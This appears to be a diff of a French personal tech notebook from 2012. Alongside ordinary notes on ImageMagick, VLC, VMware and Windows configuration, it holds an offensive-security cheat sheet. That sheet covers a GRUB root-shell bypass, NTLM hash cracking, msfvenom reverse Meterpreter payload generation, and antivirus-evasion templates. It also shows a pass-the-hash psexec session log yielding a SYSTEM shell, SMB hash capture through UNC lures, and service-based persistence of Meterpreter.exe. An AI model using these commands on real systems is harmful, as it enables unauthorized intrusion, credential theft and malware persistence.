+<p>Il faut tout d’abord accéder à la modification du boot. Pour ce faire, il suffit de <strong>sélectionner le système cible</strong>, puis de presser la touche <strong>e</strong> :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-edit.png" title="Grub boot edit" alt="Mode édition" /><p class="caption">Mode édition</p>
+</div>
+<p>Il faut rajouter le paramètre suivant à la ligne de chargement du kernel, celle-ci commence par <strong>linux</strong> :</p>
+<pre><code>init=/bin/sh</code></pre>
+<p>En pressant Ctrl-X, le système démarre et nous présente un shell root :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-modified-init.png" title="Linux root shell" alt="Shell root" /><p class="caption">Shell root</p>
+</div>
+<h2 id="image-magick"><a href="#image-magick">Image Magick</a></h2>
+<h3 id="créer-une-image"><a href="#créer-une-image">Créer une image</a></h3>
+<p>La ligne de commande suivante créer une image blanche de 100 pixels par 100 pixels :</p>
+<pre><code>convert -size 100x100 xc:white canvas.jp</code></pre>
+<h3 id="write-text-on-an-image"><a href="#write-text-on-an-image">Write text on an image</a></h3>
+<p>La ligne de commande suivante ecrit en taille 26 “My Caption” en jaune sur l’image orig.jpg aux coordonnées (200, 200) et enregistre le résultat dans dest.jpg.</p>
+<pre><code>convert -pointsize 26 -fill yellow -draw &#39;text 200,200 &quot;My Caption&quot; &#39; orig.jpg dest.jpg</code></pre>
+<p>Pour aller plus loin, il est possible d’ajouter l’argument “-font Helvetica” pour sélectionner la police.</p>
+<h2 id="john-the-ripper"><a href="#john-the-ripper">John the ripper</a></h2>
+<h3 id="hash-lm-vers-hash-ntlm"><a href="#hash-lm-vers-hash-ntlm">Hash LM vers Hash NTLM</a></h3>
+<p>Une fois les hashs LM découvert, il est souvent utiles de casser les hashs NTLM afin d’otenir le mot de passe à la casse prêt.</p>
+<pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">john</span> --rules=NT --wordlist=lmcracked.txt --format=nt hashdump.txt</code></pre>
+<h2 id="metasploit-2"><a href="#metasploit-2">Metasploit</a></h2>
+<h3 id="genération-de-payload-exécutables"><a href="#genération-de-payload-exécutables">Genération de payload exécutables</a></h3>
+<h4 id="manuel-1"><a href="#manuel-1">Manuel</a></h4>
+<pre><code># msfvenom -h
+Usage: /opt/framework/msf3/msfvenom [options] 
+
+Options:
+    -p, --payload    [payload]       Payload to use. Specify a &#39;-&#39; or stdin to use custom payloads
+    -l, --list       [module_type]   List a module type example: payloads, encoders, nops, all
+    -n, --nopsled    [length]        Prepend a nopsled of [length] size on to the payload
+    -f, --format     [format]        Format to output results in: raw, ruby, rb, perl, pl, bash, sh, c, js_be, js_le, java, dll, exe, exe-small, elf, macho, vba, vbs, loop-vbs, asp, war
+    -e, --encoder    [encoder]       The encoder to use
+    -a, --arch       [architecture]  The architecture to use
+        --platform   [platform]      The platform of the payload
+    -s, --space      [length]        The maximum size of the resulting payload
+    -b, --bad-chars  [list]          The list of characters to avoid example: &#39;\x00\xff&#39;
+    -i, --iterations [count]         The number of times to encode the payload
+    -c, --add-code   [path]          Specify an additional win32 shellcode file to include
+    -x, --template   [path]          Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
+    -h, --help                       Show this message</code></pre>
+<h4 id="exemple-1"><a href="#exemple-1">Exemple</a></h4>
+<h5 id="lister-les-options-dun-payload"><a href="#lister-les-options-dun-payload">Lister les options d’un payload</a></h5>
+<pre><code># msfvenom -p windows/meterpreter/reverse_tcp -o</code></pre>
+<h5 id="créer-un-payload-meterpreter-pour-windows"><a href="#créer-un-payload-meterpreter-pour-windows">Créer un payload meterpreter pour windows</a></h5>
+<pre><code># msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 &gt; windobReverseMeterpreter5555.exe</code></pre>
+<h5 id="créer-un-payload-meterpreter-pour-linux"><a href="#créer-un-payload-meterpreter-pour-linux">Créer un payload meterpreter pour Linux</a></h5>
+<pre><code># msfvenom -p linux/x86/meterpreter/bind_tcp -f elf LPORT=5555 &gt; linuxMeterpreter5555.bin</code></pre>
+<h4 id="alternative-1"><a href="#alternative-1">Alternative</a></h4>
+<pre><code># msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X &gt; met-reverse.exe</code></pre>
+<h3 id="lancement-de-handler-1"><a href="#lancement-de-handler-1">Lancement de handler</a></h3>
+<pre><code># msfcli multi/handler LPORT=5555 E</code></pre>
+<h3 id="exploitation-depuis-msfconsole"><a href="#exploitation-depuis-msfconsole">Exploitation depuis msfconsole</a></h3>
+<p>Cette méthode evite de charger deux fois le gros de metasploit.</p>
+<pre><code>use payload/windows/meterpreter/bind_tcp
+set LPORT 8888
+show options
+generate -t exe -f /root/meterpreter6666.exe
+back
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST 192.168.0.1
+set LPORT 8888
+exploit</code></pre>
+<h3 id="contournement-des-antivirus"><a href="#contournement-des-antivirus">Contournement des antivirus</a></h3>
+<p>Certains virus utilisent des sandboxes pour lancer les exécutables et vérifier leur dangerosité. (Mal)heureusement, ces sandboxes implémentent rarement les communication réseaux, pour des raisons de sécurités.</p>
+<p>Il est donc possible de cacher un payload malveillant en vérifiant la possibilité d’effectuer une connexion réseau. En utilisant le template <a href="../ressources/Tools/metasploit/meterpreterTemplate1.zip">ci-joint</a> et l’encoder metasploit <a href="../ressources/Tools/metasploit/xorbyte.rb">ci-joint</a> à placer dans modules/encoders/x86/xorbyte.rb.</p>
+<p>Pour une backdoor plus permanente, en bind tcp, il est possible d’utiliser le template <a href="../ressources/Tools/metasploit/meterpreterTemplate2.zip">ci-joint</a>.</p>
+<h3 id="passthehash-en-utilisant-metasploit"><a href="#passthehash-en-utilisant-metasploit">PassTheHash en utilisant metasploit</a></h3>
+<p>Le module <em>exploit/windows/smb/psexec</em> permet de réaliser de s’authentifier sur une machine Windows en PassTheHash et d’obtenir un shell meterpreter :</p>
+<pre><code># msfconsole -q
+msf &gt; use exploit/windows/smb/psexec
+msf  exploit(psexec) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+msf  exploit(psexec) &gt; set LHOST 10.42.42.42
+LHOST =&gt; 10.42.42.42
+msf  exploit(psexec) &gt; set SMBPass aad3b435ffffffffffffffffff1404ee:253b4ffffffffffffffffffff6f31185
+SMBPass =&gt; aad3b435bfffffffffffffffffff04ee:253b4a94bcfffffffffffffaf6f31185
+msf  exploit(psexec) &gt; set SMBUser Administrateur
+SMBUser =&gt; Administrateur
+msf  exploit(psexec) &gt; set RHOST 10.42.42.238
+RHOST =&gt; 10.42.42.238
+msf  exploit(psexec) &gt; exploit -z
+
+[*] Started reverse handler on 10.42.42.42:4444
+[*] Connecting to the server...
+[*] Authenticating to 10.42.42.238:445|WORKGROUP as user &#39;Administrateur&#39;...
+[*] Uploading payload...
+[*] Created \wHREjtTN.exe...
+[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.42.42.238[\svcctl] ...
+[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.42.42.238[\svcctl] ...
+[*] Obtaining a service manager handle...
+[*] Creating a new service (MLkScPls - &quot;MVZHuslgOhCiQVBanShOvcO&quot;)...
+[*] Closing service handle...
+[*] Opening service...
+[*] Starting the service...
+[*] Removing the service...
+[*] Closing service handle...
+[*] Deleting \wHREjtTN.exe...
+[*] Sending stage (752128 bytes) to 10.42.42.238
+[*] Meterpreter session 1 opened (10.42.42.42:4444 -&gt; 10.42.42.238:58782) at 2012-04-27 10:42:16 +0200
+[*] Session 1 created in the background.
+msf  exploit(psexec) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Type                   Information                  Connection
+  --  ----                   -----------                  ----------
+  1   meterpreter x86/win32  AUTORITE NT\SYSTEM @ C61112  10.42.42.42:4444 -&gt; 10.42.42.238:58782 (10.42.42.238)
+
+msf  exploit(psexec) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt;</code></pre>
+<h3 id="récupération-de-mots-de-passe"><a href="#récupération-de-mots-de-passe">Récupération de mots de passe</a></h3>
+<h4 id="exploitation-de-mauvaise-configuration-de-client-samba"><a href="#exploitation-de-mauvaise-configuration-de-client-samba">Exploitation de mauvaise configuration de client samba</a></h4>
+<p>Le module <em>auxiliary/server/capture/smb</em> permet de simuler un serveur samba avec un niveau de sécurité faible afin de capturer les hashs des utilisateurs :</p>
+<pre><code># msfconsole -q
+msf  &gt; use auxiliary/server/capture/smb
+msf  auxiliary(smb) &gt; set CAINPWFILE /tmp/smb_cain.txt
+CAINPWFILE =&gt; /tmp/smb_cain.txt
+msf  auxiliary(smb) &gt; set JOHNPWFILE /tmp/smb_john.txt
+JOHNPWFILE =&gt; /tmp/smb_john.txt
+msf  auxiliary(smb) &gt; info
+
+       Name: Authentication Capture: SMB
+     Module: auxiliary/server/capture/smb
+    Version: 14976
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  hdm &lt;hdm@metasploit.com&gt;
+
+Basic options:
+  Name        Current Setting    Required  Description
+  ----        ---------------    --------  -----------
+  CAINPWFILE  /tmp/smb_cain.txt  no        The local filename to store the hashes in Cain&amp;Abel format
+  CHALLENGE   1122334455667788   yes       The 8 byte challenge
+  JOHNPWFILE  /tmp/smb_john.txt  no        The prefix to the local filename to store the hashes in JOHN format
+  SRVHOST     0.0.0.0            yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+  SRVPORT     445                yes       The local port to listen on.
+  SSL         false              no        Negotiate SSL for incoming connections
+  SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
+  SSLVersion  SSL3               no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+
+Description:
+  This module provides a SMB service that can be used to capture the
+  challenge-response password hashes of SMB client systems. Responses
+  sent by this service have by default the configurable challenge
+  string (\x11\x22\x33\x44\x55\x66\x77\x88), allowing for easy
+  cracking using Cain &amp; Abel, L0phtcrack or John the ripper (with
+  jumbo patch). To exploit this, the target system must try to
+  authenticate to this module. The easiest way to force a SMB
+  authentication attempt is by embedding a UNC path (\\SERVER\SHARE)
+  into a web page or email message. When the victim views the web page
+  or email, their system will automatically connect to the server
+  specified in the UNC share (the IP address of the system running
+  this module) and attempt to authenticate.
+
+msf  auxiliary(smb) &gt; run
+[*] Auxiliary module execution completed
+
+[*] Server started.
+msf  auxiliary(smb) &gt; [*] Empty hash captured from 10.67.4.224:1854 captured, ignoring ...
+[*] 2012-05-03 17:56:45 +0200
+NTLMv1 Response Captured from 10.67.4.224:1854
+USER:My DOMAIN:FR OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
+LMHASH:7a0ffffffffffffffffffffffffffffffffffffffffbc673
+NTHASH:d4acfffffffffffffffffffffffffffffffffffffff88736
+
+[*] Empty hash captured from 10.42.42.24:1864 captured, ignoring ...
+[*] Empty hash captured from 10.42.42.24:1871 captured, ignoring ...
+[*] Empty hash captured from 10.42.42.24:1873 captured, ignoring ...
+[*] Empty hash captured from 10.42.42.24:1880 captured, ignoring ...
+[*] Empty hash captured from 10.42.42.24:1887 captured, ignoring ...
+
+msf  auxiliary(smb) &gt;
+
+testuser::FR:175c0e51065adfffffffffffffffffffffffffff78d268aa:175c0e51065adffffffffffffffffffffffff44078d268aa:1122334455667788</code></pre>
+<h2 id="vlc-1"><a href="#vlc-1">VLC</a></h2>
+<h3 id="transcoding-1"><a href="#transcoding-1">Transcoding</a></h3>
+<h4 id="vers-mp4-1"><a href="#vers-mp4-1">vers MP4</a></h4>
+<pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mpga,ab=192,scale=1,channels=2}:standard{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; 
+&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mp4a}:std{access=file,mux=mp4,dst=&#39;output.mp4&#39;}&quot; </code></pre>
+<h4 id="vers-avi-1"><a href="#vers-avi-1">vers AVI</a></h4>
+<pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp:sout=&quot;#transcode{vcodec=div3,vb=4000,fps=25,acodec=mp3,ab=192,channels=2,samplerate=48000,audio-sync,deinterlace,scale=1}:std{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; </code></pre>
+<h3 id="options-utiles-1"><a href="#options-utiles-1">Options utiles</a></h3>
+<pre><code>--audio, --no-audio Activer l&#39;audio (activé par défaut)
+--start-time &lt;second&gt; Démarre la vidéo à un temps donné
+--stop-time &lt;second&gt; Arrêtes la vidéo à un temps donné
+-I dummy N&#39;ouvre pas l&#39;interface graphique
+vlc://quit A mettre en fin de ligne pour fermer vlc</code></pre>
+<h3 id="net-casting-http-1"><a href="#net-casting-http-1">Net casting http</a></h3>
+<pre><code>vlc -I dummy v4l2:///dev/video0 --no-audio --sout &#39;#transcode{vcodec=mp4v,acodec=mpga,vb=900,ab=128}:std{access=http,mux=ogg,dst=192.168.0.227:8080}&#39;
+
+vlc http://ip:port</code></pre>
+<h3 id="devices-1"><a href="#devices-1">Devices</a></h3>
+<pre><code>Stream MRL syntax:
+  [[access][/demux]://]URL[#[title][:chapter][-[title][:chapter]]]
+  [:option=value ...]
+
+  Many of the global --options can also be used as MRL specific :options.
+  Multiple :option=value pairs can be specified.
+
+URL syntax:
+  file:///path/file              Plain media file
+  http://host[:port]/file        HTTP URL
+  ftp://host[:port]/file         FTP URL
+  mms://host[:port]/file         MMS URL
+  screen://                      Screen capture
+  dvd://[device]                 DVD device
+  vcd://[device]                 VCD device
+  cdda://[device]                Audio CD device
+  udp://[[&lt;source address&gt;]@[&lt;bind address&gt;][:&lt;bind port&gt;]]
+                                 UDP stream sent by a streaming server
+  vlc://pause:&lt;seconds&gt;          Pause the playlist for a certain time
+  vlc://quit                     Special item to quit VLC
+
+v4l2:///dev/video0
+cdrom://</code></pre>
+<h2 id="vmware"><a href="#vmware">VMWare</a></h2>
+<h3 id="installer-une-vm-debian-7-avec-les-vmware-tools"><a href="#installer-une-vm-debian-7-avec-les-vmware-tools">Installer une VM debian 7 avec les VMWare tools</a></h3>
+<p>Installation de mes paquets préférés :</p>
+<pre><code>apt-get update
+apt-get upgrade
+apt-get install xorg awesome awesome-extra build-essential
+apt-get install open-vm-tools open-vm-toolbox</code></pre>
+<p>Création du fichier .xinitrc :</p>
+<pre><code>cat &gt; .xinitrc &lt;&lt;EOF
+xrandr -s 1024x600
+vmware-user-suid-wrapper
+awesome
+EOF</code></pre>
+<h1 id="windows-3"><a href="#windows-3">Windows</a></h1>
+<h2 id="configuration-de-windows-en-ligne-de-commande"><a href="#configuration-de-windows-en-ligne-de-commande">Configuration de windows en ligne de commande</a></h2>
+<h3 id="configuration-de-internet-explorer-en-ligne-de-commande"><a href="#configuration-de-internet-explorer-en-ligne-de-commande">Configuration de Internet Explorer en ligne de commande</a></h3>
+<h4 id="modifier-le-proxy-utilisé"><a href="#modifier-le-proxy-utilisé">Modifier le proxy utilisé</a></h4>
+<pre><code>REM Modifying the proxy server
+Reg Add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer /t REG_SZ /d 999.999.999.999:8080 /f</code></pre>
+<h4 id="activer-le-proxy"><a href="#activer-le-proxy">Activer le proxy</a></h4>
+<pre><code>REM Activation of the proxy server
+Reg Add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable /t REG_DWORD /d 00000001 /f</code></pre>
+<h3 id="configuration-de-la-carte-réseau-en-ligne-de-commande"><a href="#configuration-de-la-carte-réseau-en-ligne-de-commande">Configuration de la carte réseau en ligne de commande</a></h3>
+<h4 id="mise-en-place-dune-ip-statique"><a href="#mise-en-place-dune-ip-statique">Mise en place d’une IP statique</a></h4>
+<pre><code>REM SPECIFICATION ADRESSE IP
+netsh interface ip set address &quot;Connexion&quot; static XXX.XXX.XXX.XXX 255.255.255.0 XXX.XXX.XXX.XXX 2</code></pre>
+<h4 id="mise-en-place-de-dns"><a href="#mise-en-place-de-dns">Mise en place de DNS</a></h4>
+<pre><code>REM SPECIFICATION ADRESSE DNS
+netsh interface ip set dns &quot;Connexion&quot; static XXX.XXX.XXX.XXX primary</code></pre>
+<pre><code>REM SPECIFICATION ADRESSE DNS SECONDAIRE
+netsh interface ip add dns &quot;Connexion&quot; XXX.XXX.XXX.XXX index=2</code></pre>
+<h4 id="mise-en-place-de-wins"><a href="#mise-en-place-de-wins">Mise en place de WINS</a></h4>
+<pre><code>REM SPECIFICATION WINS (pas sûr que ce soit nécessaire)
+netsh interface ip set wins &quot;Connexion&quot; XXX.XXX.XXX.XXX</code></pre>
+<h2 id="ligne-de-commande-windows"><a href="#ligne-de-commande-windows">Ligne de commande Windows</a></h2>
+<h3 id="gestion-des-utilisateurs-1"><a href="#gestion-des-utilisateurs-1">Gestion des utilisateurs</a></h3>
+<h4 id="activation-dun-utilisateur"><a href="#activation-dun-utilisateur">activation d’un utilisateur</a></h4>
+<pre><code>net users sysadmin /active:yes</code></pre>
+<h4 id="désactivation-dun-utilisateur"><a href="#désactivation-dun-utilisateur">Désactivation d’un utilisateur</a></h4>
+<pre><code>net users sysadmin /active:no</code></pre>
+<h3 id="gestion-des-services-1"><a href="#gestion-des-services-1">Gestion des services</a></h3>
+<pre><code>sc create Powned binPath= &quot;C:\Meterpreter.exe&quot;
+sc config Powned start= auto
+net start Powned
+sc delete Powned</code></pre>
+<h3 id="gestion-des-fichiers-1"><a href="#gestion-des-fichiers-1">Gestion des fichiers</a></h3>
+<pre><code>xcopy Meterpreter.exe c:\</code></pre>
+<h3 id="commandes-utiles"><a href="#commandes-utiles">Commandes utiles</a></h3>
+<table>
+<col width="20%" />
+<col width="61%" />
+<thead>
+<tr class="header">
+<th align="left">Commande</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td align="left"><p>regedit</p></td>
+<td align="left"><p>Ouvre l’éditeur de registre</p></td>
+</tr>
+<tr class="even">
+<td align="left"><p>services.msc</p></td>
+<td align="left"><p>Ouvre le gestionnaire de services</p></td>
+</tr>
+<tr class="odd">
+<td align="left"><p>secpol.msc</p></td>
+<td align="left"><p>Ouvre les paramètres de sécurités locales</p></td>
+</tr>
+<tr class="even">
+<td align="left"><p>inetcpl.cpl</p></td>
+<td align="left"><p>Editeur d’option internet</p></td>
+</tr>
+</tbody>
+</table>
+<h3 id="téléchargement-dun-fichier"><a href="#téléchargement-dun-fichier">Téléchargement d’un fichier</a></h3>
+<pre><code>bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip</code></pre>
+<h3 id="récupération-de-la-clé-de-license"><a href="#récupération-de-la-clé-de-license">Récupération de la clé de license</a></h3>
+<pre class="sourceCode Monobasic"><code class="sourceCode monobasic"><span class="kw">Set </span>WshShell = CreateObject(<span class="st">&quot;WScript.Shell&quot;</span>)
+key          = <span class="st">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</span>\&quot;
+ProductName  = <span class="st">&quot;Product Name : &quot;</span> &amp; WshShell.RegRead(key &amp; <span class="st">&quot;ProductName&quot;</span>) &amp; vbNewLine
+ProductId    = <span class="st">&quot;Product Id : &quot;</span>   &amp; WshShell.RegRead(key &amp; <span class="st">&quot;ProductId&quot;</span>)   &amp; vbNewLine
+ProductKey   = <span class="st">&quot;Install Key : &quot;</span>  &amp; Converted(WshShell.RegRead(key &amp; <span class="st">&quot;DigitalProductId&quot;</span>))
+
+WScript.echo ProductName &amp; ProductId &amp; ProductKey
+
+<span class="kw">Function </span>Converted(id)
+    <span class="kw">Const</span> OFFSET = 52
+    i = 28
+    Chars = <span class="st">&quot;BCDFGHJKMPQRTVWXY2346789&quot;</span>
+
+    <span class="kw">Do</span>
+        Cur = 0
+        x = 14
+        <span class="kw">Do</span>
+            Cur = Cur * 256
+            Cur = id(x + OFFSET) + Cur
+            id(x + OFFSET) = (Cur \ 24) <span class="kw">And</span> 255
+            Cur = Cur Mod 24
+            x = x -1
+        <span class="kw">Loop While </span>x &gt;= 0
+
+        i = i - 1
+        Converted = Mid(Chars, Cur + 1, 1) &amp; Converted
+
+        <span class="kw">If </span>(((29 - i) Mod 6) = 0) <span class="kw">And</span> (i &lt;&gt; -1) <span class="kw">Then</span>
+            i = i -1
+            Converted = <span class="st">&quot;-&quot;</span> &amp; Converted
+        <span class="kw">End If</span>
+    <span class="kw">Loop While </span>i &gt;= 0
+<span class="kw">End Function</span></code></pre>
 <div id="footer">
   &copy; 2012 <a href="http://https://github.com/phil2600/tech-scribe/">Tech-Scribe</a>
 </div>
